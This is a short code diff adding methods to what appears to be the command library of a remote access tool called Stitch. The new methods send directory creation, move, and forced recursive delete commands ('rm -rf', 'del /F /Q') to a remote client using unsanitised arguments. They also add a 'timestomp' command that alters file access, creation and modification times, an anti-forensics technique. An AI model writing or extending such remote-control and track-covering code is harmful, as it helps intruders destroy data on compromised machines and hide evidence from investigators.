@@ -66,6 +66,53 @@ class stitch_commands_library:
         else:
             self.cli_hosts_file = '/etc/hosts'
 
+    # Filesystem utilities used by web interface
+    def mkdir(self, args):
+        if not args:
+            st_print('[*] Usage: mkdir [directory]')
+            return
+        if windows_client(system=self.cli_os):
+            cmd = 'mkdir {}'.format(args)
+        else:
+            cmd = 'mkdir -p {}'.format(args)
+        self.send(cmd)
+        st_print(self.receive())
+
+    def mv(self, args):
+        if not args:
+            st_print('[*] Usage: mv [source] [destination]')
+            return
+        if windows_client(system=self.cli_os):
+            cmd = 'move {}'.format(args)
+        else:
+            cmd = 'mv {}'.format(args)
+        self.send(cmd)
+        st_print(self.receive())
+
+    def rm(self, args):
+        if not args:
+            st_print('[*] Usage: rm [path]')
+            return
+        if windows_client(system=self.cli_os):
+            cmd = 'del /F /Q {}'.format(args)
+        else:
+            cmd = 'rm -rf {}'.format(args)
+        self.send(cmd)
+        st_print(self.receive())
+
+    def timestomp(self, mode, file_path):
+        if not file_path:
+            st_print('[*] Usage: timestomp [a|c|m] [file]')
+            return
+        if mode == 'a':
+            self.editaccessed(file_path)
+        elif mode == 'c':
+            self.editcreated(file_path)
+        elif mode == 'm':
+            self.editmodified(file_path)
+        else:
+            st_print('[!] Unknown timestomp mode. Use a/c/m')
+
     def history_check(self):
         self.Config = ConfigParser.ConfigParser()
         self.Config.read(hist_ini)
